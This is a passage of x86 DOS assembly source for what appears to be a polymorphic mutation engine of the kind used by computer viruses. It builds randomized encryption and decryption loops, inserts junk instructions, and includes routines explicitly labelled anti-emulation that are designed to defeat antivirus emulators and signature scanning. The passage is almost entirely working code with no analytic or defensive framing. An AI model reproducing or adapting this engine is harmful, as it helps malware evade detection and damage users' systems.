                     ; ** 1/4 chance of enforced Key. **
                     ;
                     mov   al,by ds:[m_key.1]
                     and   al,7
                    DONE
                    push    ax
                    mov     bx,ofs get_reg16_mask
                    test    by ds:[poly_flags],pf_word
                    DOIF    Z
                     mov    bl,low ofs get_reg8_mask
                    DONE
                    call    bx
                    mov     bx,ax
                    and     ax,wo ds:[used_regs]
                    cmp     ax,bx
                    pop     ax
                   REPEAT   NE
                    cmp     bx,BIT (_SP + _AH)
                   REPEAT   E
                    mov     bl,by ds:[m_plaintxt.1]
                    xor     bl,al
                    cmp     bl,rm_Reg
                   REPEAT   E
                    mov     bl,by ds:[m_key.1]
                    xor     bl,al
                    cmp     bl,rm_Reg
                  CYCLE     E
   mod_crypt_switch       =         $-2
   mods_only          =         _JZ
   mods_and_crypts        =         03Ch   ; cmp al
                  shl  al,3
                  pop  bp
                  or   by es:[bp.1],al ; encode reg2
                DONE
               DONE
               pop bx
               call    optimise
               pop bx bp
               ret

   ;----------------------------------------------------------------------------
   ; INPUT:
   ; es:di = construction buffer
   ;
   ; OUTPUT:
   ; es:di = end of construction

   make_mod:       STATUS  <MAKE_MOD(?)>
               test    by ds:[poly_done],NOT mods_done
               DOIF    NZ
                STATUS <DONE>
                mov    wo ds:[crypt_obj],ofs m_key
                call   get_crypt_level
                DO
                 clc
                 mov   by ds:[mod_crypt_switch],mods_only
                 push  cx
                 call  make_modcryp
                 call  garble1
                 pop   cx
                CYCLE  LU
                and    by ds:[poly_done],mods_done
               DONE
               ret

   ;----------------------------------------------------------------------------
   ; INPUT:
   ; none.
   ;
   ; OUTPUT:
   ; cx = crypt / mod level

   get_crypt_level:    push    ax
               call    rand7
               or  al,8
               xchg    cx,ax
               pop ax
               ret

   ;----------------------------------------------------------------------------
   ; CRYPT OPS
   ;
   ca_none =   0   ; No Parameter
   ca_byte =   2   ; 8 bit Parameter
   ca_bw   =   1   ; 8 bit for byte, 16 bit for word Parameter
   ca_reg  =   3   ; Register Parameter

   CryptOp macro   Probability, OpByte, Command, Op1, Op2, ArgType

       db  Probability
       db  NOT(Command OR OpByte), NOT( (Op2 SHL 2) OR (Op1 SHR 1) OR ArgType)

       endm

   crypt_ops:
       CryptOp 20, 1, 080h, _ADD, _SUB, ca_bw
       CryptOp 12, 1, 080h, _XOR, _XOR, ca_bw
       CryptOp 04, 1, 0F6h, _NOT, _NOT, ca_none
       CryptOp 04, 1, 0F6h, _NEG, _NEG, ca_none
       CryptOp 06, 1, 0FEh, _INC, _DEC, ca_none
       CryptOp 06, 1, 0D0h, _ROL, _ROR, ca_none
       CryptOp 08, 1, 0C0h, _ROL, _ROR, ca_byte
       CryptOp 35, 0, 000h, _ADD, _SUB, ca_reg
       CryptOp 20, 0, 000h, _XOR, _XOR, ca_reg

   ;****************************************************************************
   ;* Loop Stuff ***************************************************************
   ;****************************************************************************
   ;
   ; INPUT:
   ; bx = top of loop
   ; es:di = construction buffer
   ;
   ; OUTPUT:
   ; es:di = construction complete

   encode_loop:        STATUS  <ENCODE_LOOP>
               push    bx
               mov ax,wo ds:[m_count]
               call    test_reg
               mov al,by ds:[count_meth]
               mov ah,10
               shr ax,1
               mul ah      ; * 5
               mov bx,ofs loop_table
               xlat
               pop bx
               xchg    cx,ax
               lea ax,[bx-2]
               sub ax,di
               call    is_ax_signed
               DOIF    NZ
                 xchg  cx,ax
                 xor   al,1
                 stosw
                 push  di
                 call  garble1
                 call  encode_jmp
                 pop   bx
                 mov   ax,di
                 sub   ax,bx
                 mov   by es:[bx-1],al
                 ret
                ;DOELSE
                DONE
                 xchg  ah,al
                 mov   al,cl
                 stosw
                 ret
               ;DONE

   ;----------------------------------------------------------------------------
   ; db JconOP
   ; dw X - Count (INC), Y + Count (DEC)
   ; X = Lower boundary of range where condition untrue.
   ; Y = Upper boundary of range where condition untrue.

   loop_table:     db  _JNZ
               dw  0,0

               db  _JS
               dw  0,07FFFh

               db  _JNS
               dw  8000h,0FFFFh

   ;= counter/ptr inc dec ======================================================
   ;
   ; INPUT:
   ; es:di = construction buffer
   ;
   ; OUTPUT:
   ; es:di = construction complete

   inc_ptr:        STATUS  <INC_PTR(?)>
               test    by ds:[poly_done],NOT incptr_done
               jz  @licr
               STATUS  <DONE>
               and by ds:[poly_done],incptr_done
               mov ax,wo ds:[m_index.2]
               mov bx,1
               test    by ds:[poly_flags],pf_word
               DOIF    NZ
                inc    bx
               DONE
               test    by ds:[poly_flags],pf_backward
               DOIF    NZ
                neg    bx
               DONE
               sub ax,bx
               mov wo ds:[m_index.2],ax
               mov bl,by ds:[m_index.1]
               and bl,00111111b
               or  ax,ax
               DOIF    NZ
                or bl,rm_08
                call   is_ax_signed
                DOIF   NZ
                 xor   bl,rm_08 XOR rm_16
                DONE
                cmp    bl,iBP
               CYCLE   E
               mov by ds:[m_index.1],bl
               call    plaintxt_to_index
               mov al,by ds:[m_ptr.1]
               xor al,rm_Reg XOR 40h
               mov bl,2
               test    by ds:[poly_flags],pf_word
               DOIF    Z
                dec    bx
               DONE
               test    by ds:[poly_flags],pf_backward
               jmp dcip

   ;----------------------------------------------------------------------------
   ; INPUT:
   ; es:di = construction buffer
   ;
   ; OUTPUT:
   ; es:di = construction complete

   dec_count:      STATUS  <DEC_COUNT(?)>
               test    by ds:[poly_done],NOT deccount_done
               DOIF    Z
       @licr:       ret
               DONE
               STATUS  <DONE>
               and by ds:[poly_done],deccount_done
               mov al,by ds:[m_count.1]
               xor al,rm_Reg XOR 040h
               mov bx,?
   count_mul       =   $-2
               test    by ds:[count_meth],1
       dcip:       DOIF    NZ
                xor    al,40h XOR 48h
               DONE

   ;----------------------------------------------------------------------------
   ; INPUT:
   ; al = reg16 OR 40h (INC) / 48h (dec)
   ; bl = amount to inc / dec
   ;
   ; es:di = construction buffer
   ;
   ; OUTPUT:
   ; es:di = construction complete

   encode_inc_dec:     STATUS  <ENCODE_INC_DEC>
               push    ax bx
               mov bh,al
               ;DO
       @incdecl:
                mov    al,bl
                inc    ax
                call   rand_b
                or al,al
                DOIF   NZ
                  ;
                  ; ** ADD/SUB **
                  ;
                  sub  bl,al
                  inc  bx
                  call probability
                  DOIF S
                    ; - Single
                    mov    ch,bh
                    test   ch,8
                    DOIF   NZ
                     xor   ch,((rm_Reg OR _SUB) XOR 48h) XOR ((rm_Reg OR _ADD) XOR 40h)
                    DONE
                    xor    ch,(rm_Reg OR _ADD) XOR 40h
                    call   probability
                    DOIF   NZ
                     neg   al
                     xor   ch,(_ADD XOR _SUB)
                    DONE
                    push   ax
                    mov    al,83h
                    mov    ah,ch
                    stosw
                    pop    ax
                    stosb
                    call   garble1
                   DOELSE
                    ; - Multiple
                    cbw
                    test   bh,8
                    DOIF   NZ
                     neg   ax
                    DONE
                    xchg   bp,ax
                    mov    al,3
                    call   rand_b
                    cwd
                    inc    ax
                    inc    ax
                    xchg   cx,ax
                    DO
                     push  bx di
                     and   bx,0000011100000000b
                     or    bx,((rm_Reg + _ADD) SHL 8) + 81h
                     call  any_rand
                     cmp   cl,1
                     DOIF  E
       @@incdecl:         jnz  @incdecl
                      mov  ax,bp
                      sub  ax,dx
                     DONE
                     add   dx,ax
                     call  probability
                     DOIF  PO
                      neg  ax
                      xor  bh,(_ADD XOR _SUB)
                     DONE
                     xchg  bx,ax
                     stosw
                     xchg  bx,ax
                     stosw
                     pop   bx
                     call  optimise
                     pop   bx
                     push  cx
                     call  garble1
                     pop   cx
                    CYCLE  LU
                  DONE

                 DOELSE
                  ;
                  ; ** INC/DEC **
                  ;
                  STO_B  bh
                  call   garble1
                DONE
                dec    bl
       ;JUMPS
       ;       CYCLE   NZ
       ;NOJUMPS         ;
                jnz    @@incdecl

                pop    bx ax
                ret

   ;****************************************************************************
   ;* Jump Stuff ***************************************************************
   ;****************************************************************************
   ;
   ; INPUT:
   ; bx = jmp dest
   ; es:di = construction buffer
   ;
   ; OUTPUT:
   ; es:di = construction complete

   encode_jmp:     push    ax bx cx bx
               call    _encode_jmp
               pop ax
               add wo es:[bx],ax
               pop cx bx ax
               ret

   ;----------------------------------------------------------------------------
   ; INPUT:
   ; es:di = construction buffer
   ;
   ; OUTPUT:
   ; al = ret type
   ; es:bx = relocation position
   ; es:di = construction complete

   _encode_push:       call    probability
               pushf
               DOIF    A       ; e=ret, c=retf, nsne=iret
                STO_B  09Ch        ; pushf
               DONE
               DOIF    NE
                STO_B  0Eh     ; push cs
               DONE
               call    probability
               ; push imm
               DOIF    PO
                 STO_B 068h
                 mov   bx,di
                 xor   ax,ax
                 stosw
                ; or mov reg, push reg
                DOELSE
                 call  load16_reloc
                 or    al,050h
                 stosb
               DONE
               popf
               mov al,0C3h     ; ret
               DOIF    NZ
                mov    al,0CBh     ; retf
                DOIF   NC
                 mov   al,0CFh     ; iret
                DONE
               DONE
               ret

   ;----------------------------------------------------------------------------
   ; INPUT:
   ; es:di = construction buffer
   ;
   ; OUTPUT:
   ; es:bx = relocation position
   ; es:di = construction complete

   _encode_jmp:        call    probability
               DOIF    BE
                 STO_B 0E9h
                 lea   ax,[di+2]
                 neg   ax
                 mov   bx,di
                 stosw
                 ret
                ;DOELSEIF S
                DONE
                DOIF S
                 call  _encode_push
                 stosb
                 ret
                DONE
                ;DOELSE
                 call  load16_reloc
                 xchg  ah,al
                 or    ax,0E0FFh
                 stosw
                 ret
               ;DONE

   ;----------------------------------------------------------------------------
   ; INPUT:
   ; es:di = construction buffer
   ;
   ; OUTPUT:
   ; al = ret type
   ; es:bx = relocation position
   ; es:di = construction complete

   _encode_call:           call    probability
               DOIF    A
                STO_B  0E8h
                lea    ax,[di+2]
                neg    ax
                mov    bx,di
                stosw
                lea    bx,[di-2]
                mov    al,0C3h
                ret
               DONE
               ;
               call    _encode_push
               push    ax bx
               call    _encode_jmp
               pop si ax
               add wo es:[si],di
               ret

   ;----------------------------------------------------------------------------
   ; INPUT:
   ; es:di = construction buffer
   ;
   ; OUTPUT:
   ; al=reg16
   ; es:bx = relocation position
   ; es:di = construction complete

   load16_reloc:       call    get_free_reg16
               mov bh,1
               call    load16
               lea bx,[di-2]
               and wo es:[bx],0
               ret

   ;****************************************************************************
   ;* Junk Routines ************************************************************
   ;****************************************************************************

   no_garble:      dbw 101,<ofs null_func>

   jmp_garble:     dbw 19,<ofs many_junk_ops>
               ;
   dos_garble:     dbw 10,<ofs many_junk_ops>
               dbw 15,<ofs junk_jcond>
               dbw 15,<ofs junk_loop>
               dbw 10,<ofs junk_push_pop>
               dbw 05,<ofs junk_anti_emul0>
               dbw 10,<ofs junk_anti_emul1>
               dbw 17,<ofs junk_int>
               dbw 18,<ofs junk_jmp_call>

   ;----------------------------------------------------------------------------
   garble4:        mov cx,4
               jmp garble
   garble1:        mov cx,1

   garble:         IFNDEF  GARBLING
               ret
           ENDIF

               STATUS  <GARBLE>
               push    ax bx dx bp si
               push    wo ds:[rng_seed]
               mov wo ds:[rng_seed],ofs junk_seed
               DO
                mov    si,?
   garble_routines      =  $-2
                push   cx
                call   percent_ax
                call   ax
                pop    cx
               CYCLE   LU
               pop wo ds:[rng_seed]
               pop si bp dx bx ax
               ret

   ;= Different Junk structures ================================================

   many_junk_ops:  IFNDEF  GARBLE_MANY_JUNK_OPS
               ret
           ENDIF

               STATUS  <MANY_JUNK_OPS>
               mov ax,3
               call    rand_b
               inc ax
               inc ax
               xchg    bp,ax
               call    probability
               DOIF    A
                mov    ax,08A00h
                jmp    _@mjo_do
               DONE
               DO
                ;call  probability
       ;========================================================
            IFDEF  GARBLE_RM
               IFDEF GARBLE_IMM
                jpo    @mjo_imm
               ENDIF

                DO
                 call  any_rand
                 and   al,00111000b
                 cmp   al,_CMP
                CYCLE  E
                or al,2
                jmp    @@mjo_do
           ENDIF

       ;--------------------------------------------------------
           IFDEF   GARBLE_IMM

       @mjo_imm:    js @mjo_n80
                DO         ; 80h
                 call  any_rand
                 and   al,00111000b
                 cmp   al,_CMP
                CYCLE  E
                mov    ah,80h
       _@mjo_do:    jmp    @mjo_do

       ;--------------------------------------------------------
       @mjo_n80:    jo @mjo_nD0C0
                DO         ; 0D0h,0D2h,0C0h
                  call any_rand
                  and  ax,1200h + 0000000000111000b
                  add  ah,0C0h
                  cmp  ah,0C2h
                 REPEAT E
                  cmp  al,_SAL
                CYCLE  E
                jmp    @mjo_do

       ;--------------------------------------------------------
       @mjo_nD0C0:  call   any_rand    ; 0F6h, 0FEh
                and    al,00011000b
                mov    ah,0FEh
                test   al,00010000b
                DOIF   NZ
                 mov   ah,0F6h
                DONE

           ENDIF
       ;========================================================
       @mjo_do:     xchg   ah,al
       @@mjo_do:        push   di
                call   make_junk_op
                pop    bx
                push   bp
                call   optimise
                pop    bp
                dec    bp
               CYCLE   NS
               ret

   ;----------------------------------------------------------------------------
   junk_jcond: IFDEF   GARBLE_JCOND

               STATUS  <JUNK_JCOND>
               call    probability
               DOIF    BE
                 mov   si,ofs junk_cmp
                 call  percent_ax
                 push  di
                 call  make_junk_op
                 pop   bx
                 call  optimise
                DOELSE
                 call  any_rand
                 and   ax,0701h
                 call  test_reg
               DONE
               call    any_rand
               and al,0Fh
               or  al,70h
               stosw
               push    di
               call    many_junk_ops
               pop bx
               mov ax,di
               sub ax,bx
               mov by es:[bx-1],al
           ENDIF
               ret

   junk_cmp:       dbw 25,3880h    ; CMP  R,imm
               dbw 15,0038h    ; CMP  R,M
               dbw 15,003Ah    ; CMP  M,R
               dbw 20,00F6h    ; TEST R,imm
               dbw 25,0084h    ; TEST R,M

   ;----------------------------------------------------------------------------
   junk_loop:  IFDEF   GARBLE_LOOP

               STATUS  <JUNK_LOOP>
               push    wo ds:[used_regs]
               mov bh,BIT _CX
               call    push_bh
               mov al,120
               call    rand_b
               add al,100
               test    by ds:[poly_flags],pf_inloop
               DOIF    NZ
                shr    al,2
               DONE
               xchg    bx,ax
               or  wo ds:[used_regs],(BIT _CL) OR (BIT _CH)
               mov al,_CX
               call    load16
               push    di
               call    many_junk_ops
               STO_B   0E2h        ; loop
               pop ax
               stc
               sbb ax,di
               stosb
               pop wo ds:[used_regs]
               mov bh,BIT _CX
               jmp pop_bh
           ELSE
               ret
           ENDIF

   ;----------------------------------------------------------------------------
   ;   sti     cli
   ;   push 0
   ;   pop reg0
   ;l1:SP -= 2
   ;   pop reg1
   ;   test reg1
   ;   jz l1   jnz
   ;
   junk_anti_emul0:IFDEF   GARBLE_ANTI_EMUL0

               STATUS  <JUNK_ANTI_EMUL0>
               test    by ds:[poly_flags],pf_inloop
               DOIF    Z
                mov    al,0FBh     ; STI
                call   probability
                pushf
                DOIF   C
                 dec   ax      ; CLI
                DONE
                stosb
                DOIF   S
                  STO_W    006Ah       ; PUSH 0
                 DOELSE
                  call get_free_reg16
                  mov  ah,1
                  push ax
                  xchg ah,al
                  call zero_reg    ; zero reg0
                  pop  ax
                  or   al,50h      ; PUSH reg0
                  stosb
                DONE
                 call  get_free_reg16
                 or    al,58h      ; POP reg1
                stosb
                push   di
                call   probability
                DOIF   O
                  STO_W  04C4Ch    ; DEC SP, DEC SP
                 DOELSE
                  STO_W  0EC83h    ; SUB SP,
                  STO_B  2     ; +02
                DONE
                call   get_free_reg16
                or al,58h      ; POP reg2
                stosb
                add    ax,(100h - 58h)
                xchg   ah,al
                call   test_reg
                pop    bx
                popf
                mov    al,_JZ
                adc    al,0    ; JNZ
                stosb
                xchg   bx,ax
                stc
                sbb    ax,di
                stosb          ; $-xx
               DONE
           ENDIF
               ret

   ;----------------------------------------------------------------------------
   ; mov ax,xxxx
   ; aam / aad
   ; cmp ax,xxxx
   ; je loc1
   ; jmp far / terminate
   ; loc1:
   ;
   junk_anti_emul1:IFDEF   GARBLE_ANTI_EMUL1

               STATUS  <JUNK_ANTI_EMUL1>
               test    by ds:[poly_flags],pf_inloop
               jz  junk_anti_emul2
               mov bh,BIT _AX
               call    push_bh
               call    any_rand
               and ax,01F7Fh
               add ax,00101h
               mov wo cs:[jae_ax],ax
               xchg    bx,ax
               xor ax,ax
               call    load16
               mov ax,(10 SHL 8)
               call    rand
               mov al,0D4h     ; AAM
               adc ax,0B00h    ; AAD on CF
               mov wo cs:[jae_op],ax
               stosw
               DO
                call   any_rand
                and    al,18h
               CYCLE   Z
               or  al,25h
               stosb           ; XOR/CMP/SUB AX,imm
               mov ax,?
   jae_ax          =   $-2
   jae_op:         aam
               stosw
               mov bh,BIT _AX
               call    pop_bh
               call    any_rand
               mov al,0
               or  ax,8000h + _JNZ
               stosw
           ENDIF
               ret

   ;----------------------------------------------------------------------------
   junk_anti_emul2:IFDEF   GARBLE_ANTI_EMUL2

               STATUS  <JUNK_ANTI_EMUL2>
               mov bh,(BIT _CX) + (BIT _DI) + (BIT _SI)
               call    push_bh
               call    any_rand
               xchg    bx,ax
               mov al,_SI
               pushf
               pushf
               adc al,0        ; _DI
               and bh,0F7h     ; so we can do MOVSW
               call    load16
               popf
               mov ax,0F789h   ; MOV DI,SI
               DOIF    C
                mov    ah,0FEh     ; MOV SI,DI
               DONE
               stosw
               mov bx,7
               test    by ds:[poly_flags],pf_inloop
               DOIF    Z
                mov    bl,100
               DONE
               mov ax,bx
               call    rand
               add bx,ax
               mov al,_CX
               call    load16
               mov ax,0A5F3h   ; rep movsw
               popf
               DOIF    S
                dec    ah      ; movsb
               DONE
               stosw
               mov bh,(BIT _CX) + (BIT _DI) + (BIT _SI)
               jmp pop_bh
           ELSE
               ret
           ENDIF

   ;----------------------------------------------------------------------------
   junk_int:   IFDEF   GARBLE_INT

               STATUS  <JUNK_INT>
               call    probability
               pushf
               test    by ds:[poly_flags],pf_inloop
               mov si,ofs junk_ints
               mov ax,no_of_junk_ints_loop
               DOIF    Z
                 popf
                 DOIF  BE
                  mov  si,ofs junk_int_cfdx
                  mov  al,no_of_junk_ints
                 DONE
                DOELSE
                 popf
                 js    junk_anti_emul2
               DONE
               call    rand
               add ax,ax
               add si,ax
               cmp si,ofs junk_int_cfdx
               pushf
               pushf
               lodsw
               push    ax
               xchg    bx,ax
               mov cx,bx
               call    push_bh
               pop bx
               mov al,_AH
               call    load8
               popf
               push    cx
               DOIF    AE
                mov    al,-1
                call   rand_b
                xchg   bx,ax
                mov    al,_DX
                call   load16
                call   probability
                DOIF   S
                 DO
                  call get_free_reg16
                  or   al,al
                 CYCLE Z
                 mov   ah,1
                 xchg  ah,al
                 call  zero_reg
                 DOELSE
                  STO_B 0F8h
                DONE
               DONE
               STO_W   021CDh
               pop bx
               call    pop_bh
               popf
               DOIF    AE
                call   any_rand
                mov    al,0
                or ax,8000h + _JNC
                stosw
               DONE
           ENDIF
               ret

   int_call    MACRO   _ah, _regs
            local  _x

            db _ah
            _x = (BIT _AX)

            IRP _y, <_regs>
             _x = (_x OR (BIT _y))
            ENDM

            db _x

           ENDM


   junk_ints:  int_call    0Bh, <>
           int_call    0Dh, <>
           int_call    4Dh, <>
           int_call    54h, <>
           int_call    30h, <_BX, _CX>
           int_call    51h, <_BX>
           int_call    62h, <_BX>
   no_of_junk_ints_loop =  ((ofs $ - ofs junk_ints) / 2)

   junk_int_cfdx:  int_call    3Ah, <_DX>
           int_call    3Bh, <_DX>
           int_call    3Dh, <_DX>
           int_call    41h, <_DX>
           int_call    43h, <_DX>
           int_call    4Eh, <_DX>
           int_call    5Ch, <_DX>
   no_of_junk_ints =   ((ofs $ - ofs junk_int_cfdx) / 2)

   ;----------------------------------------------------------------------------
   junk_push_pop:  IFDEF   GARBLE_PUSH_POP

               STATUS  <JUNK_PUSH_POP>
               call    rand7
               or  al,50h
               stosb
               call    probability
               DOIF    O
                dec    di
                mov    ax,36FFh
                stosw
                call   rand_b
                stosw
               DONE
               call    many_junk_ops
               call    get_free_reg16
               or  al,58h
               stosb
           ENDIF
               ret

   ;----------------------------------------------------------------------------
   junk_routine_entry  STRUC

       j_reloc     dw  ?
       j_used_regs dw  ?
       j_return    dw  ?
       j_use_ret   db  ?
       j_poly_flags    db  ?

   junk_routine_entry  ENDS

   junk_jmp_call:  IFDEF   GARBLE_JMP_CALL

               STATUS  <JUNK_JMP_CALL>
               mov si,wo ds:[junk_rout_ptr]
               cmp si,(JUNK_ROUT_MAX * SIZE junk_routine_entry)
               DOIF    B
                push   si
                call   probability
                DOIF   S
                  call _encode_jmp
                  xor  al,al
                 DOELSE
                  call _encode_call
                DONE
                pop    si
                mov    by ds:[si.junk_rout_table.j_use_ret],al
                mov    wo ds:[si.junk_rout_table.j_return],di
                mov    wo ds:[si.junk_rout_table.j_reloc],bx
                push   wo ds:[used_regs]
                pop    wo ds:[si.junk_rout_table.j_used_regs]
                mov    al,by ds:[poly_flags]
                mov    by ds:[si.junk_rout_table.j_poly_flags],al
                add    si,SIZE junk_routine_entry
                mov    wo ds:[junk_rout_ptr],si
               DONE

           ENDIF
               ret

   make_junk_routs:IFDEF   GARBLE_JMP_CALL

               STATUS  <MAKE_JUNK_ROUTS>
               mov wo ds:[garble_routines],ofs jmp_garble
               mov si,wo ds:[junk_rout_ptr]
               or  si,si
               DOWHILE NZ
                mov    bx,wo ds:[(si-(SIZE junk_routine_entry)).junk_rout_table.j_reloc]
                add    wo es:[bx],di
                push   wo ds:[(si-(SIZE junk_routine_entry)).junk_rout_table.j_used_regs]
                pop    wo ds:[used_regs]
                mov    al,by ds:[(si-(SIZE junk_routine_entry)).junk_rout_table.j_poly_flags]
                mov    by ds:[poly_flags],al
                push   wo ds:[(si-(SIZE junk_routine_entry)).junk_rout_table.j_use_ret]
                push   wo ds:[(si-(SIZE junk_routine_entry)).junk_rout_table.j_return]
                call   garble1
                pop    bx ax
                or al,al
                DOIF   Z
                 call  encode_jmp
                 cmp   al,?
                 org   $-1
                DONE
                stosb
                sub    si,SIZE junk_routine_entry
               CYCLE
           ENDIF
               ret

   ;============================================================================
   ;
   ; INPUT:
   ; AX = ModRM style opcode.
   ;
   ; OUTPUT:
   ; opcode emited.

   make_junk_op:       STATUS  <MAKE_JUNK_OP>

               xchg    bx,ax       ; bx=opcode
               DO
                call   get_free_reg16
                mov    ah,1

           IFDEF   GARBLE_REG8
                 call  probability
                 DOIF  A
                  mov  dl,by ds:[used_regs.bLO]
                  inc  dl
                  ANDIF NZ
                   call get_free_reg8
                 DONE

           ENDIF

                xchg   ah,al       ; ax=ModRM
                cmp    ax,?
   last_junk_reg        =  $-2
               CYCLE   E
               mov wo ds:[last_junk_reg],ax

               or  bl,bl
               DOIF    S
                cmp    bl,83h
                DOIF   A
                 cmp   bl,90h
                 cmc
                DONE
                BREAK  NC
                ;
                ; ** Immediate Ops **
                ;
                or ah,rm_Reg
                push   di
                or ax,bx
                stosw          ; emit opcode/RM
                cmp    bx,00F6h    ; TEST r,imm
                DOIF   E
                 sub   al,(0F6h - 80h)
                DONE
                cmp    al,0C8h
                xchg   bx,ax
                DOIF   B
           @mjoar:   call  any_rand
                 stosb
                 cmp   bl,81h
                 DOIF  E
                  inc  bx
                  jmp  @mjoar
                 DONE
                DONE
                pop    bx
                jmp    optimise
               DONE
                ;
                ; *** ModRM Ops ***
                ;
               push    ax
               call    any_rand
               or  ax,ax
               DOIF    S
                and    al,8
                or al,26h
                stosb
               DONE
               pop ax
               or  al,bl   ; bl=opcode, ax=ModRM
               stosb
               xchg    bx,ax   ; bh = reg
               shl bh,3
               xor dx,dx
               call    probability

           IFDEF   GARBLE_RM_MEM
               js  @mjrm_mem
           ENDIF

           IFDEF   GARBLE_RM_REG

               ; register
               call    rand7
               call    probability
               or  bh,rm_Reg
               jmp @@mjrm_do

           ENDIF
               ; mem
       @mjrm_mem:
           IFDEF   GARBLE_RM_IMM
               ja  @mjrm_imm16
           ENDIF

           IFDEF   GARBLE_RM_MEM

               test    bl,1    ; no word ptr's
               jnz @mjrm_imm16
               DO
                call   rand7
                or al,4
                cmp    al,iBP
               CYCLE   E
               xor dl,dl
               call    probability
               DOIF    S
                DOIF   A
                 inc   dx
                 add   al,40h
                DONE
                inc    dx
                add    al,40h
               DONE
       @@mjrm_do:  jmp @mjrm_do

       @mjrm_imm16:    ; imm16
               mov dl,2
               mov al,6
           ELSE
            @@mjrm_do:

           ENDIF

               ; al=R/M, DX=parameter bytes
       @mjrm_do:   or  al,bh
               DO
                stosb
                DO
                 call  any_rand
                 cmp   al,by es:[di-1]
                CYCLE  E
                dec    dx
               CYCLE   NS
               ret

   ;----------------------------------------------------------------------------
   push_bh:        xor dx,dx
               DO
                shr    bh,1
                DOIF   C
                 mov   ax,dx
                 call  get_reg16_mask
                 test  wo ds:[used_regs],ax
                 DOIF  NZ
                  mov  al,50h
                  or   al,dl
                  stosb
                 DONE
                DONE
                inc    dx
                or bh,bh
               CYCLE   NZ
               ret

   pop_bh:         mov dx,7
               DO
                shl    bh,1
                DOIF   C
                 mov   ax,dx
                 call  get_reg16_mask
                 test  wo ds:[used_regs],ax
                 DOIF  NZ
                  mov  al,58h
                  or   al,dl
                  stosb
                 DONE
                DONE
                dec    dx
                or bh,bh
               CYCLE   NZ
               ret

   ;****************************************************************************
   ;* Random Number Stuff ******************************************************
   ;****************************************************************************
   ;
   ; INPUT:
   ; None
   ;
   ; OUTPUT:
   ; Flags = Random

   probability:    push    ax
           call    any_rand
           pop ax
           ret

   ;----------------------------------------------------------------------------
   rand7:      mov al,8
           cmp ax,?
           org $-2

   ;----------------------------------------------------------------------------
   any_rand:   xor ax,ax

   ;----------------------------------------------------------------------------
   rand_b:     cbw

   ;----------------------------------------------------------------------------
   ; INPUT:
   ; AX = exclusive MAX limit (0 for anything)
   ; RNG_SEED set
   ;
   ; OUTPUT:
   ; AX = 0 <= Return < Input AX
   ; Flags = result of SAHF
   ;
   rand:       push    si cx dx
           push    ax
           mov si,?
   rng_seed    =   $-2
           mov ax,wo cs:[si.wLO]
           mov dx,wo cs:[si.wHI]   ; load seed
           mov cx,17
           DO
            or dh,dh           ; shift feedback loop
            DOIF   S
             xor   al,1
            DONE
            test   al,01010111b
            DOIF   PO
             stc
            DONE
            rcr    dx,1
            rcr    ax,1
           CYCLE   LU
           mov wo cs:[si.wHI],dx   ; save seed
           mov wo cs:[si.wLO],ax
           pop cx          ; normalise
           jcxz    @rng0
            xor    dx,dx
            div    cx
            xchg   dx,ax
           @rng0:
           sahf                ; set flags
           pop dx cx si
           ret

   ;= RNG initilisation ========================================================

   ; INPUT:
   ; none.
   ;
   ; OUTPUT:
   ; none.

   init_rng_seeds:     mov wo ds:[rng_seed],ofs master_seed
               mov si,ofs junk_seed
               in  ax,40h      ; junk
               and ax,07h
               xchg    cx,ax
               xor bx,bx
               call    init_dual_rng
               mov ah,2Ah      ; e, d
               int 21h
               mov cl,dh
               and cx,7
               mov bl, 4

   ;----------------------------------------------------------------------------
   ; INPUT:
   ; rand32 XOR cx = 32 bit seed
   ; ds:si, ds:si.bx = seeds to init
   ;
   ; OUTPUT:
   ; si += 4
   ; ax <=> dx
   ; both seeds loaded

   init_dual_rng:      call    any_rand
               xchg    dx,ax
               call    any_rand
               xor ax,cx
               DO
                mov    wo ds:[si],ax
                mov    wo ds:[bx.si],ax
                inc    si
                inc    si
                xchg   dx,ax
                cmc
               CYCLE   C
               ret
   ENGINE_END = $
   ;****************************************************************************
   ;* Heap *********************************************************************
   ;****************************************************************************

   poly_flags  db  ?
   poly_done   db  ?

   count_meth  dw  ?

   after_jmp   dw  ?

   ; ModRM objects
   ;
   m_ptr       db  2 dup(?)    ;           -\__ Reg16s
   m_count     db  2 dup(?)        ;       -/
   m_index     db  4 dup(?)    ;                   -\ Same Size
   m_key       db  2 dup(?)    ;             - Reg  -
   m_plaintxt  db  4 dup(?)    ; (possibly m_index)-/

   used_regs   dw  ?

   master_seed dd  ?
   junk_seed   dd  ?
   d_seed      dd  ?
   e_seed      dd  ?

   junk_rout_ptr   dw  ?
   junk_rout_table junk_routine_entry  JUNK_ROUT_MAX dup(?,?,?,?)

   ;============================================================================
